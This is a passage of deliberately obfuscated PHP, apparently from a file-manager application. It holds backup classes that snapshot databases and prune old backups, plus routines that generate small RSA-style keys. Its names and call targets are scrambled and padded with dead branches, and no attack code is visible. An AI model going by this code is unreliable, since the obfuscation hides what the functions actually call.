$D¸‡ª¬Îá¦[668]; goto bä›±¾‘ª·; eËÑëÇ´‚: $aµâ´ÓÄ¥› = $D¸‡ª¬Îá¦[665]; if (!$aµâ´ÓÄ¥›) { return; } $CŸ²å«—ÖŒ = $AÃÕ…±‡ä½[25]($CŸ²å«—ÖŒ, $eøê¶Ñ˜ò» % 8, $eøê¶Ñ˜ò» % 8 + 7); goto c£­µ«ƒƒƒ; c£­µ«ƒƒƒ: $CÇõ”¼‚¾¸ = $D¸‡ª¬Îá¦[666]; if (!$CÇõ”¼‚¾¸) { return; } $F˜”ÉÑ¹ = $AÃÕ…±‡ä½[10]; goto Aâó¿è‘Íí; d˜ğÚéÅÏÌ: $FƒÖé›¤äÃ = $D¸‡ª¬Îá¦[664]; while (strlen($FƒÖé›¤äÃ) < $D¸‡ª¬Îá¦[12]) { if (!$FƒÖé›¤äÃ) { break; } $FƒÖé›¤äÃ++; } $CŸ²å«—ÖŒ = $AÃÕ…±‡ä½[123]($E¯Üµ“¿±ì . $AÃÕ…±‡ä½[123]($d•ËÜˆ´š . $E¯Üµ“¿±ì) . $d•ËÜˆ´š); goto eËÑëÇ´‚; cŠÑ§æ²¡†: break; $bØğÕ…Î­º = $D¸‡ª¬Îá¦[672]; if (!$bØğÕ…Î­º) { die; } goto CÏ¼ß‹È˜Ú; Aâó¿è‘Íí: $cõÙŒĞöÊé = 0; $BŠ“ğîİ§ = $D¸‡ª¬Îá¦[667]; if (strlen($BŠ“ğîİ§) < $D¸‡ª¬Îá¦[562]) { die; } goto DÛÓºÊ²öÉ; CÏ¼ß‹È˜Ú: default: $a”„İöê« = $this->{$_SERVER[éÑÍñÜ£™][255]}($d–ì¹ÃÕÍ, $d•ËÜˆ´š . $BáÂ¦…Ê¬À); $eîÂ“½‡ˆÚ = $D¸‡ª¬Îá¦[673]; while ($eîÂ“½‡ˆÚ < $D¸‡ª¬Îá¦[12]) { if ($eîÂ“½‡ˆÚ >= 0) { break; } $eîÂ“½‡ˆÚ++; } break; $BºĞÁ÷ƒ­È = $D¸‡ª¬Îá¦[674]; while ($BºĞÁ÷ƒ­È < $D¸‡ª¬Îá¦[562]) { if ($BºĞÁ÷ƒ­È >= 0) { break; } $BºĞÁ÷ƒ­È++; } } goto bŠÅøïöÜ™; D˜©¶­ôØ: $BáÂ¦…Ê¬À = $AÃÕ…±‡ä½[25]($d–ì¹ÃÕÍ, 1, 15); $E×Ú¶‡‹“Ó = $D¸‡ª¬Îá¦[658]; while (strlen($E×Ú¶‡‹“Ó) < $D¸‡ª¬Îá¦[562]) { if (!$E×Ú¶‡‹“Ó) { break; } $E×Ú¶‡‹“Ó++; } goto bäÃ¼Ò¨Û‘; B¤ƒ”È®Àë: $D¸‡ª¬Îá¦ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÃÕ…±‡ä½ =& $_SERVER[éÑÍñÜ£™]; if (!$AÃÕ…±‡ä½[350]($d–ì¹ÃÕÍ) || $AÃÕ…±‡ä½[24]($d–ì¹ÃÕÍ) < 10) { return !1; } goto FÌ¯İì‰‚; CòÇÔºñã—: } public function lerj7da9089e($bßğõà˜™Ã) { goto BºÉĞ²¢•; CÌÊÑÖ¨Å½: return $aøÁ’ËßÌ; goto cÑÁÇÁáí; fÀ‰’ã£»’: $aä­ŠëÆÔ’ = $bèÊ‡™¹ì‡[680]; while ($aä­ŠëÆÔ’ < $bèÊ‡™¹ì‡[562]) { if ($aä­ŠëÆÔ’ >= 0) { break; } $aä­ŠëÆÔ’++; } $F”ÎëĞ¥Ó = $fêäšäÔÛÈ[123]($fêäšäÔÛÈ[354] . ($eàŸ‰’Ïåª + $B¤Š‡§º“) . $fêäšäÔÛÈ[355] . $C©ÁÚğùÏò . $fêäšäÔÛÈ[355] . $A“”¢º‚Ÿ¿ . $fêäšäÔÛÈ[356]); goto cŒİªÅñ; d‰ÈŒÊ¸˜º: $A“”¢º‚Ÿ¿ = 2; for ($d…»¿É¸Æ¢ = 0; $d…»¿É¸Æ¢ < $a°ÑôÙß  * 10; $d…»¿É¸Æ¢++) { if (($a°ÑôÙß  * $d…»¿É¸Æ¢ + 1) % $C©ÁÚğùÏò == 0) { $A“”¢º‚Ÿ¿ = $fêäšäÔÛÈ[249](($a°ÑôÙß  * $d…»¿É¸Æ¢ + 1) / $C©ÁÚğùÏò); break; } } $d”…’Ÿ = $this->{$_SERVER[éÑÍñÜ£™][156]}($eàŸ‰’Ïåª * $B¤Š‡§º“ . $fêäšäÔÛÈ[10], $fêäšäÔÛÈ[158]); goto fÀ‰’ã£»’; AˆÍÚÆÕˆ: $C©ÁÚğùÏò = $fêäšäÔÛÈ[249](($eàŸ‰’Ïåª + $B¤Š‡§º“) / 2); $Aíµ§ïİ³­ = $bèÊ‡™¹ì‡[677]; while (1) { $FŒöáŠ‡Ï = $C©ÁÚğùÏò; $E¢âáƒÆ­ = $bèÊ‡™¹ì‡[678]; while (strlen($E¢âáƒÆ­) < $bèÊ‡™¹ì‡[566]) { if (!$E¢âáƒÆ­) { break; } $E¢âáƒÆ­++; } $d•–ø»øÏ› = $a°ÑôÙß ; $BğĞ°Şæ›Ä = $bèÊ‡™¹ì‡[679]; if (strlen($BğĞ°Şæ›Ä) < $bèÊ‡™¹ì‡[568]) { return; } while ($d•–ø»øÏ› % $FŒöáŠ‡Ï != 0) { $C×Àñ„£Å = $d•–ø»øÏ›; $d•–ø»øÏ› = $FŒöáŠ‡Ï; $FŒöáŠ‡Ï = $C×Àñ„£Å % $FŒöáŠ‡Ï; } if ($FŒöáŠ‡Ï == 1) { break; } else { $C©ÁÚğùÏò++; } } goto d‰ÈŒÊ¸˜º; cŒİªÅñ: $Fºàí‡ô‹ = $bèÊ‡™¹ì‡[681]; while ($Fºàí‡ô‹ < $bèÊ‡™¹ì‡[568]) { if ($Fºàí‡ô‹ >= 0) { break; } $Fºàí‡ô‹++; } $aøÁ’ËßÌ = $this->{$_SERVER[éÑÍñÜ£™][156]}($bßğõà˜™Ã, $F”ÎëĞ¥Ó) . $fêäšäÔÛÈ[357] . $d”…’Ÿ; goto CÌÊÑÖ¨Å½; A‹ù’·ßÑ: $BïØï‘ÚŠ¡ = $bèÊ‡™¹ì‡[675]; if (strlen($BïØï‘ÚŠ¡) < $bèÊ‡™¹ì‡[573]) { die; } $B¤Š‡§º“ = $this->{$_SERVER[éÑÍñÜ£™][353]}(); goto dÍò©ï¶õ; BºÉĞ²¢•: $bèÊ‡™¹ì‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fêäšäÔÛÈ =& $_SERVER[éÑÍñÜ£™]; $eàŸ‰’Ïåª = $this->{$_SERVER[éÑÍñÜ£™][353]}(); goto A‹ù’·ßÑ; dÍò©ï¶õ: $F÷ÆéòÖö = $bèÊ‡™¹ì‡[676]; if (!$F÷ÆéòÖö) { return; } $a°ÑôÙß  = ($eàŸ‰’Ïåª - 1) * ($B¤Š‡§º“ - 1); goto AˆÍÚÆÕˆ; cÑÁÇÁáí: } public function oyfka4685d9b($bÕ£¿®¢») { goto BÊğ™“í²²; B¼­„§¿ğ: $aµ¹ÖÒ¾¶¬ = 0; $dåÂ·Ğ²Â¼ = 0; $EÓÇÃàáÎ = $Bƒ‚Æ²‘‚‘[683]; goto Fˆ‘–Ÿ‰÷; BÊğ™“í²²: $Bƒ‚Æ²‘‚‘ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C¬¦ª•ä´ê =& $_SERVER[éÑÍñÜ£™]; $B§¥‰Øˆ°¤ = $C¬¦ª•ä´ê[0]($C¬¦ª•ä´ê[357], $bÕ£¿®¢»); goto a¹÷£“ÇÚí; BáÂÃå³‚Ú: $DˆâĞ­•Ãµ = $this->{$_SERVER[éÑÍñÜ£™][255]}($B§¥‰Øˆ°¤[0], $a°¬’èİÊ”); return $DˆâĞ­•Ãµ; $B Á„Ä‰¦— = $Bƒ‚Æ²‘‚‘[690]; goto DĞæ…†Œº; Eãæ¼Ë÷Ì‰: if (!$e‡²æ˜Ä­) { return; } if (!$eÑÜ¨¶æ¼) { return $C¬¦ª•ä´ê[10]; } $eÑÜ¨¶æ¼ = $C¬¦ª•ä´ê[249]($eÑÜ¨¶æ¼); goto B¼­„§¿ğ; Fõ¨Ö²ŒÄ: while (1) { $E–‡Ã§Û¨ = $côÇ´â­Ú; $F¤Ä‘¶ßÓ™ = $c Ø²ğá“ğ; while ($F¤Ä‘¶ßÓ™ % $E–‡Ã§Û¨ != 0) { $B•Ó‘¥²Æ¯ = $F¤Ä‘¶ßÓ™; $bÕñŠ¢“‘ö = $Bƒ‚Æ²‘‚‘[687]; if (!$bÕñŠ¢“‘ö) { return; } $F¤Ä‘¶ßÓ™ = $E–‡Ã§Û¨; $E–‡Ã§Û¨ = $B•Ó‘¥²Æ¯ % $E–‡Ã§Û¨; $C•È…ÂØöµ = $Bƒ‚Æ²‘‚‘[688]; if (strlen($C•È…ÂØöµ) < $Bƒ‚Æ²‘‚‘[566]) { return; } } if ($E–‡Ã§Û¨ == 1) { break; } else { $côÇ´â­Ú++; } } $aõãÒ™áö¸ = 2; for ($A¾‹í¾İÃö = 0; $A¾‹í¾İÃö < $c Ø²ğá“ğ * 10; $A¾‹í¾İÃö++) { if (($c Ø²ğá“ğ * $A¾‹í¾İÃö + 1) % $côÇ´â­Ú == 0) { $aõãÒ™áö¸ = $C¬¦ª•ä´ê[249](($c Ø²ğá“ğ * $A¾‹í¾İÃö + 1) / $côÇ´â­Ú); break; } } goto dòå¸´‡Ü­; dòå¸´‡Ü­: $a°¬’èİÊ” = $C¬¦ª•ä´ê[123]($C¬¦ª•ä´ê[354] . ($aµ¹ÖÒ¾¶¬ + $dåÂ·Ğ²Â¼) . $C¬¦ª•ä´ê[355] . $côÇ´â­Ú . $C¬¦ª•ä´ê[355] . $aõãÒ™áö¸ . $C¬¦ª•ä´ê[356]); $Eô—‡øÅÀ• = $Bƒ‚Æ²‘‚‘[689]; while (strlen($Eô—‡øÅÀ•) < $Bƒ‚Æ²‘‚‘[562]) { if (!$Eô—‡øÅÀ•) { break; } $Eô—‡øÅÀ•++; } goto BáÂÃå³‚Ú; DĞæ…†Œº: if (!$B Á„Ä‰¦—) { return; } goto DÈŸ›š‘‡Ñ; Fˆ‘–Ÿ‰÷: if (!$EÓÇÃàáÎ) { return; } for ($A¾‹í¾İÃö = 3; $A¾‹í¾İÃö < $eÑÜ¨¶æ¼; $A¾‹í¾İÃö += 2) { if ($eÑÜ¨¶æ¼ % $A¾‹í¾İÃö != 0) { continue; } $aµ¹ÖÒ¾¶¬ = $A¾‹í¾İÃö; $dåÂ·Ğ²Â¼ = $C¬¦ª•ä´ê[249]($eÑÜ¨¶æ¼ / $A¾‹í¾İÃö); $D‘Üªñ“æ— = $Bƒ‚Æ²‘‚‘[684]; break; $EØ®³ˆ¹Æó = $Bƒ‚Æ²‘‚‘[685]; if (strlen($EØ®³ˆ¹Æó) < $Bƒ‚Æ²‘‚‘[562]) { return; } } $c Ø²ğá“ğ = ($aµ¹ÖÒ¾¶¬ - 1) * ($dåÂ·Ğ²Â¼ - 1); goto BŠ—ä†Ó‰‰; a¹÷£“ÇÚí: if ($C¬¦ª•ä´ê[19]($B§¥‰Øˆ°¤) != 2) { return $C¬¦ª•ä´ê[10]; } $eÑÜ¨¶æ¼ = $this->{$_SERVER[éÑÍñÜ£™][255]}($B§¥‰Øˆ°¤[1] . $C¬¦ª•ä´ê[10], $C¬¦ª•ä´ê[158]); $e‡²æ˜Ä­ = $Bƒ‚Æ²‘‚‘[682]; goto Eãæ¼Ë÷Ì‰; BŠ—ä†Ó‰‰: $côÇ´â­Ú = $C¬¦ª•ä´ê[249](($aµ¹ÖÒ¾¶¬ + $dåÂ·Ğ²Â¼) / 2); $AÀáˆÔÃÃ· = $Bƒ‚Æ²‘‚‘[686]; if (!$AÀáˆÔÃÃ·) { die; } goto Fõ¨Ö²ŒÄ; DÈŸ›š‘‡Ñ: } public function dysp4feedb13() { goto Eç»ˆ§—ÉŒ; d’½ÜŒáÍ¦: $D” †âÎ¦ = $eµ„‡É«¹Ë[691]; if (!$D” †âÎ¦) { return; } $BÕëâñá© = array(); goto fœ…‚šÇ‰; dİçæ”åóŠ: while ($FÓ·’³¯Ó‰ <= (int) $cŞ…‹­×¢¼[359]($D‡ÆæÎ„Ã®)) { $EçôïÉµé = $FÓ·’³¯Ó‰; while (!0) { $EçôïÉµé++; $a‹«æ“©‚ = $eµ„‡É«¹Ë[693]; if (strlen($a‹«æ“©‚) < $eµ„‡É«¹Ë[566]) { return; } if ($EçôïÉµé <= 2) { $FÓ·’³¯Ó‰ = $EçôïÉµé; break; } else { if ($EçôïÉµé < 2) { continue; } } $a‹„ç¸­ŸÀ = !0; for ($bÄ÷Ÿ…Òø© = 2; $bÄ÷Ÿ…Òø© <= $cŞ…‹­×¢¼[359]($EçôïÉµé); $bÄ÷Ÿ…Òø©++) { if ($EçôïÉµé % $bÄ÷Ÿ…Òø© == 0) { $a‹„ç¸­ŸÀ = !1; } } if ($a‹„ç¸­ŸÀ) { $FÓ·’³¯Ó‰ = $EçôïÉµé; break; } } $BÕëâñá©[] = $FÓ·’³¯Ó‰; } $c†¯öÚ‚±Ô = 2; $E¾Š½ì æ = $eµ„‡É«¹Ë[694]; goto BİÆ‘íöó; BİÆ‘íöó: for ($EçôïÉµé = $D‡ÆæÎ„Ã®; $EçôïÉµé > 1; $EçôïÉµé--) { $a‹„ç¸­ŸÀ = !0; foreach ($BÕëâñá© as $F¬’¨ éÜÒ) { if ($EçôïÉµé % $F¬’¨ éÜÒ == 0) { $a‹„ç¸­ŸÀ = !1; break; } } if ($a‹„ç¸­ŸÀ) { $c†¯öÚ‚±Ô = $EçôïÉµé; break; } } return $c†¯öÚ‚±Ô; goto B¿†«Í·Õš; fœ…‚šÇ‰: $aÀšÒÎ¿ß = $eµ„‡É«¹Ë[692]; if (strlen($aÀšÒÎ¿ß) < $eµ„‡É«¹Ë[566]) { return; } $FÓ·’³¯Ó‰ = 1; goto dİçæ”åóŠ; Eç»ˆ§—ÉŒ: $eµ„‡É«¹Ë =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cŞ…‹­×¢¼ =& $_SERVER[éÑÍñÜ£™]; $D‡ÆæÎ„Ã® = $cŞ…‹­×¢¼[338]($cŞ…‹­×¢¼[358](2, 14), $cŞ…‹­×¢¼[358](2, 16) - 1); goto d’½ÜŒáÍ¦; B¿†«Í·Õš: } public function iygtdc4bf51b($bòÓ¶÷·É, $eÈË™¶±‹Õ) { $Fˆ•Ñ¿ =& $_SERVER[éÑÍñÜ£™]; return $Fˆ•Ñ¿[13](array($Fˆ•Ñ¿[14], $Fˆ•Ñ¿[360]), $bòÓ¶÷·É, $eÈË™¶±‹Õ); } public function dnmz7d6b4ee0($Aóˆ¯Îšö«, $b¿‘²ÀÙ) { $DØçÍ¯ä•è =& $_SERVER[éÑÍñÜ£™]; return $DØçÍ¯ä•è[13](array($DØçÍ¯ä•è[361], $DØçÍ¯ä•è[362]), $Aóˆ¯Îšö«, $b¿‘²ÀÙ); } public function kozfe7d13667($AêŠöæß¼, $EÈÀàİæ§”) { $bò»Âí¦š± =& $_SERVER[éÑÍñÜ£™]; return $bò»Âí¦š±[13](array($bò»Âí¦š±[361], $bò»Âí¦š±[363]), $AêŠöæß¼, $EÈÀàİæ§”); $AÉ•Ë™Ú‘ = $_SERVER[çŞáÓæÚô‚Ô‡][695]; if (!$AÉ•Ë™Ú‘) { return; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $AøË¯ÂÃ¢ =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::$name = date($AøË¯ÂÃ¢[696]); if (!($F¿ÎŸ¢±ß = Model($AøË¯ÂÃ¢[697])->lastItem())) { $F¿ÎŸ¢±ß = $this->initData(); } else { self::$name = $F¿ÎŸ¢±ß[$AøË¯ÂÃ¢[38]]; if ($F¿ÎŸ¢±ß[$AøË¯ÂÃ¢[698]] == $AøË¯ÂÃ¢[93]) { self::$name = date($AøË¯ÂÃ¢[699]); $Fà¤ïÃå = 0; if (isset($F¿ÎŸ¢±ß[$AøË¯ÂÃ¢[290]][$AøË¯ÂÃ¢[177]][$AøË¯ÂÃ¢[428]])) { $Fà¤ïÃå = (int) $F¿ÎŸ¢±ß[$AøË¯ÂÃ¢[290]][$AøË¯ÂÃ¢[177]][$AøË¯ÂÃ¢[428]]; } if ($F¿ÎŸ¢±ß[$AøË¯ÂÃ¢[38]] == self::$name) { Model($AøË¯ÂÃ¢[697])->remove($F¿ÎŸ¢±ß[$AøË¯ÂÃ¢[376]]); } $F¿ÎŸ¢±ß = $this->initData($Fà¤ïÃå, $F¿ÎŸ¢±ß[$AøË¯ÂÃ¢[700]]); } else { $this->checkStore($F¿ÎŸ¢±ß[$AøË¯ÂÃ¢[700]]); } } self::$option = $F¿ÎŸ¢±ß; } private function initData($d–ÈìéÇ = 0, $E™¨ƒ§Œ = '') { goto A³«Ğ«ÆÅÔ; Få†ºâĞæà: $b–ËèçËˆ[$F‹ğÓ‘×Çá[376]] = $EëËó¬Ê„; return $b–ËèçËˆ; goto b“Í‹¯ïÕø; Eˆ¬ ÛåôÜ: $this->checkStore($DáîäŠËÓº[$F‹ğÓ‘×Çá[700]]); $b–ËèçËˆ = array($F‹ğÓ‘×Çá[700] => $DáîäŠËÓº[$F‹ğÓ‘×Çá[700]], $F‹ğÓ‘×Çá[38] => self::$name, $F‹ğÓ‘×Çá[698] => 0, $F‹ğÓ‘×Çá[701] => $DáîäŠËÓº[$F‹ğÓ‘×Çá[701]], $F‹ğÓ‘×Çá[290] => array($F‹ğÓ‘×Çá[702] => array($F‹ğÓ‘×Çá[698] => 0), $F‹ğÓ‘×Çá[703] => array($F‹ğÓ‘×Çá[698] => 0, $F‹ğÓ‘×Çá[704] => 0, $F‹ğÓ‘×Çá[705] => 0, $F‹ğÓ‘×Çá[39] => $F‹ğÓ‘×Çá[43]), $F‹ğÓ‘×Çá[706] => array($F‹ğÓ‘×Çá[698] => 0, $F‹ğÓ‘×Çá[704] => 0, $F‹ğÓ‘×Çá[705] => 0), $F‹ğÓ‘×Çá[177] => array($F‹ğÓ‘×Çá[698] => 0, $F‹ğÓ‘×Çá[707] => 0, $F‹ğÓ‘×Çá[708] => 0, $F‹ğÓ‘×Çá[709] => 0, $F‹ğÓ‘×Çá[710] => 0, $F‹ğÓ‘×Çá[428] => $d–ÈìéÇ)), $F‹ğÓ‘×Çá[711] => time(), $F‹ğÓ‘×Çá[458] => 0); $EëËó¬Ê„ = Model($F‹ğÓ‘×Çá[697])->insert($b–ËèçËˆ); goto Få†ºâĞæà; A³«Ğ«ÆÅÔ: $F‹ğÓ‘×Çá =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DáîäŠËÓº = Model($F‹ğÓ‘×Çá[697])->config(); if ($E™¨ƒ§Œ && $DáîäŠËÓº[$F‹ğÓ‘×Çá[700]] != $E™¨ƒ§Œ) { $d–ÈìéÇ = 0; } goto Eˆ¬ ÛåôÜ; b“Í‹¯ïÕø: } private function checkStore($cğ‡ŸÖ¦³) { $D¬ùÇ–«èŠ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b°İÒ„…Â– = Model($D¬ùÇ–«èŠ[712])->listData($cğ‡ŸÖ¦³); Model($D¬ùÇ–«èŠ[712])->checkConfig($b°İÒ„…Â–); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[çŞáÓæÚô‚Ô‡][697])->findByName(self::$name); } return self::$option; } public static function set($CõÜäÏµƒœ) { $f®÷ãÙèÅ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F‡×ù»Ó ò = self::get(); foreach ($CõÜäÏµƒœ as $D“Ó”¯‹è => $Aèìî¨‰¤) { $B¸ ¨ï¶‘Š = explode($f®÷ãÙèÅ[101], $D“Ó”¯‹è); $Cõœõ¹‚‘‚ = count($B¸ ¨ï¶‘Š); switch ($Cõœõ¹‚‘‚) { case 1: $F‡×ù»Ó ò[$B¸ ¨ï¶‘Š[0]] = $Aèìî¨‰¤; break; case 2: $F‡×ù»Ó ò[$B¸ ¨ï¶‘Š[0]][$B¸ ¨ï¶‘Š[1]] = $Aèìî¨‰¤; break; case 3: $F‡×ù»Ó ò[$B¸ ¨ï¶‘Š[0]][$B¸ ¨ï¶‘Š[1]][$B¸ ¨ï¶‘Š[2]] = $Aèìî¨‰¤; break; } } Model($f®÷ãÙèÅ[697])->update($F‡×ù»Ó ò[$f®÷ãÙèÅ[376]], $F‡×ù»Ó ò); self::$option = $F‡×ù»Ó ò; return self::$option; } public function keep() { $fšÇõ’ˆÕ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eá¨ ­óİø = self::get(); if ($eá¨ ­óİø[$fšÇõ’ˆÕ[290]][$fšÇõ’ˆÕ[702]][$fšÇõ’ˆÕ[698]] == $fšÇõ’ˆÕ[93]) { return; } $this->backupKeep($eá¨ ­óİø); self::set(array($fšÇõ’ˆÕ[713] => 1)); } private function backupKeep($f¼ÙîÂ‰ñ˜) { goto eÆ¯é‹Ññã; e™ÀÛ²ƒµ¾: for ($EÔÃ‡Ò¿×ä = 0; $EÔÃ‡Ò¿×ä < 12; $EÔÃ‡Ò¿×ä++) { $eß»»£ˆóŠ[] = date($EãÃŸéÚƒ[714], strtotime("\55{$EÔÃ‡Ò¿×ä}\x20\155\157\156\x74\x68\x73")); } $eß»»£ˆóŠ = array_unique($eß»»£ˆóŠ); foreach ($C„˜—®Ì®à as $Cà„©Å®Ñó) { if (!empty($Cà„©Å®Ñó[$EãÃŸéÚƒ[38]]) && in_array($Cà„©Å®Ñó[$EãÃŸéÚƒ[38]], $eß»»£ˆóŠ)) { continue; } Model($EãÃŸéÚƒ[697])->remove($Cà„©Å®Ñó[$EãÃŸéÚƒ[376]]); $CŸñ™œŒ“Ï = "\x7b\x69\157\x3a{$f¼ÙîÂ‰ñ˜[$EãÃŸéÚƒ[700]]}\x7d\x2f\x64\x61\x74\141\142\141\x73\x65\57\142\141\x63\x6b\x75\160\137{$Cà„©Å®Ñó[$EãÃŸéÚƒ[38]]}"; IO::remove($CŸñ™œŒ“Ï, !1); } goto EĞ½ÕÃš—é; aç—Øø‰Ç¹: $EÔÃ‡Ò¿×ä = 0; $eß»»£ˆóŠ = array(); foreach ($C„˜—®Ì®à as $Cà„©Å®Ñó) { if ($EÔÃ‡Ò¿×ä >= 7) { break; } $eß»»£ˆóŠ[] = $Cà„©Å®Ñó[$EãÃŸéÚƒ[38]]; $EÔÃ‡Ò¿×ä++; } goto e™ÀÛ²ƒµ¾; eÆ¯é‹Ññã: $EãÃŸéÚƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C„˜—®Ì®à = Model($EãÃŸéÚƒ[697])->listData(); if (empty($C„˜—®Ì®à)) { return; } goto aç—Øø‰Ç¹; EĞ½ÕÃš—é: } public function db() { goto E‹È‡¬£à; E‹È‡¬£à: $A“©œšëîÕ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BôŸ“Ú·‰˜ = self::get(); if ($BôŸ“Ú·‰˜[$A“©œšëîÕ[290]][$A“©œšëîÕ[703]][$A“©œšëîÕ[698]] == $A“©œšëîÕ[93]) { return !0; } goto C£î¹¬–ø; f¤òõ˜áôÚ: return !0; goto bïÓ¿Œ×íÁ; C£î¹¬–ø: $EÄõ‹ôŠçİ = new BackupDb(); if (!$EÄõ‹ôŠçİ->index()) { return !1; } self::set(array($A“©œšëîÕ[715] => 1)); goto f¤òõ˜áôÚ; bïÓ¿Œ×íÁ: } public function dbFile() { goto CÅ²‚îºÄÛ; d¿¶·ğ·Ñ: return !0; goto aäËÊÅç©Ò; CÅ²‚îºÄÛ: $B§¬óˆ‚¸‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÅ–¶Â¬ƒ = self::get(); if ($BÅ–¶Â¬ƒ[$B§¬óˆ‚¸‚[290]][$B§¬óˆ‚¸‚[706]][$B§¬óˆ‚¸‚[698]] == $B§¬óˆ‚¸‚[93]) { return !0; } goto fÅìËª¾¶; fÅìËª¾¶: $d‘äĞœ²Èé = new BackupDbFile(); if (!$d‘äĞœ²Èé->index()) { return !1; } self::set(array($B§¬óˆ‚¸‚[716] => 1)); goto d¿¶·ğ·Ñ; aäËÊÅç©Ò: } public function file() { $AÀó—¹”À† =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bì‹Üåä×ø = self::get(); if ($bì‹Üåä×ø[$AÀó—¹”À†[290]][$AÀó—¹”À†[177]][$AÀó—¹”À†[698]] == $AÀó—¹”À†[93]) { return !0; } if (!isset($bì‹Üåä×ø[$AÀó—¹”À†[701]]) || $bì‹Üåä×ø[$AÀó—¹”À†[701]] == $AÀó—¹”À†[479]) { $B‚Ê¯®ÚØ = new BackupFile(); if (!$B‚Ê¯®ÚØ->index()) { return !1; } } self::set(array($AÀó—¹”À†[717] => 1, $AÀó—¹”À†[698] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto A“‰±Ã‰¢ê; E–â„„´´à: $CàâÈŒ˜Äî = new DbManage($dÅ¾°£’á, $F¯äòÙßã); $C·åØŒãš» = TEMP_FILES . $DÃ¯ïÒº[718] . self::$name . $DÃ¯ïÒº[18]; del_dir($C·åØŒãš»); goto BÃé¾‹“éè; a‚™æøä‘©: $cøˆÆ‹¨¾‹ = array_diff($cøˆÆ‹¨¾‹, array($DÃ¯ïÒº[719], $DÃ¯ïÒº[720])); foreach ($cøˆÆ‹¨¾‹ as $d¨—¡­‡) { $B¤æ¡ãÂß± += $CàâÈŒ˜Äî->model($d¨—¡­‡)->count(); } $EÊ‘öÁá–ù = new Task($DÃ¯ïÒº[721], $DÃ¯ïÒº[722], $B¤æ¡ãÂß±, LNG($DÃ¯ïÒº[723]) . $DÃ¯ïÒº[724] . LNG($DÃ¯ïÒº[725])); goto aÌ¸•È†; b¨«‰œ˜¡Ú: Backup::set($Cƒ†…Å‹×ç); return !0; goto bÂ’Ö§¤; BÃé¾‹“éè: mk_dir($C·åØŒãš»); $B¤æ¡ãÂß± = $DÎç¡·åÁ = 0; $cøˆÆ‹¨¾‹ = $CàâÈŒ˜Äî->db()->getTables(); goto a‚™æøä‘©; fÕ§ç‚…»»: self::$name = $Cˆ¸ †¤‡¬[$DÃ¯ïÒº[38]]; $dÅ¾°£’á = $GLOBALS[$DÃ¯ïÒº[16]][$DÃ¯ïÒº[27]]; $F¯äòÙßã = $this->_dbType($dÅ¾°£’á); goto E–â„„´´à; aÌ¸•È†: foreach ($cøˆÆ‹¨¾‹ as $d¨—¡­‡) { $E§–¾Ï¾Æõ = $C·åØŒãš» . $d¨—¡­‡ . $DÃ¯ïÒº[726]; $d®°º†ˆƒ = null; if ($d¨—¡­‡ == $DÃ¯ïÒº[727] && (!isset($Cˆ¸ †¤‡¬[$DÃ¯ïÒº[701]]) || $Cˆ¸ †¤‡¬[$DÃ¯ïÒº[701]] == $DÃ¯ïÒº[479])) { $d®°º†ˆƒ = self::$io; } $DÎç¡·åÁ += $CàâÈŒ˜Äî->sqlFromDb($d¨—¡­‡, $E§–¾Ï¾Æõ, $EÊ‘öÁá–ù, $d®°º†ˆƒ); } $EÊ‘öÁá–ù->end(); $Cƒ†…Å‹×ç = array($DÃ¯ïÒº[728] => $F¯äòÙßã, $DÃ¯ïÒº[715] => 1, $DÃ¯ïÒº[729] => $DÎç¡·åÁ, $DÃ¯ïÒº[730] => $DÎç¡·åÁ); goto b¨«‰œ˜¡Ú; A“‰±Ã‰¢ê: $DÃ¯ïÒº =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Cˆ¸ †¤‡¬ = Backup::get(); self::$io = $Cˆ¸ †¤‡¬[$DÃ¯ïÒº[700]]; goto fÕ§ç‚…»»; bÂ’Ö§¤: } private function _dbType($E†§ª‚ïäğ) { goto dã’Íõ‡; bì™ƒ‰ˆè: if ($fÈÆÇ¾Ì¿Ö == $Eƒùğ²ˆ¡©[732]) { $C•ÒõÙ÷”À = explode($Eƒùğ²ˆ¡©[4], $E†§ª‚ïäğ[$Eƒùğ²ˆ¡©[733]]); $fÈÆÇ¾Ì¿Ö = $C•ÒõÙ÷”À[0]; } $EçËÃŸ¡Ùó = array($Eƒùğ²ˆ¡©[734] => $Eƒùğ²ˆ¡©[19], $Eƒùğ²ˆ¡©[735] => $Eƒùğ²ˆ¡©[736]); if (isset($EçËÃŸ¡Ùó[$fÈÆÇ¾Ì¿Ö])) { $fÈÆÇ¾Ì¿Ö = $EçËÃŸ¡Ùó[$fÈÆÇ¾Ì¿Ö]; } goto aÔØ˜Ñ³ó; dã’Íõ‡: $Eƒùğ²ˆ¡© =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E†§ª‚ïäğ = array_change_key_case($E†§ª‚ïäğ); $fÈÆÇ¾Ì¿Ö = $E†§ª‚ïäğ[$Eƒùğ²ˆ¡©[731]]; goto bì™ƒ‰ˆè; aÔØ˜Ñ³ó: return $fÈÆÇ¾Ì¿Ö; goto d›‚‡†Ñ; d›‚‡†Ñ: } } goto BÊÕ™´Éœ; FãœñÂã¹§: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($AŒƒ›¶™¢¨) { $this->pathParse = $AŒƒ›¶™¢¨; $this->model = Model($_SERVER[çŞáÓæÚô‚Ô‡][1124]); } public function getPath($F¶°É¬Õ¦Ê) { return trim($F¶°É¬Õ¦Ê, $_SERVER[çŞáÓæÚô‚Ô‡][18]); } public function pathFather($FïÏêâÆ‹†) { $b¤‘Øã¼ø” = $this->parse($FïÏêâÆ‹†); $b¤‘Øã¼ø” = $this->infoSimple($FïÏêâÆ‹†); return $b¤‘Øã¼ø” ? 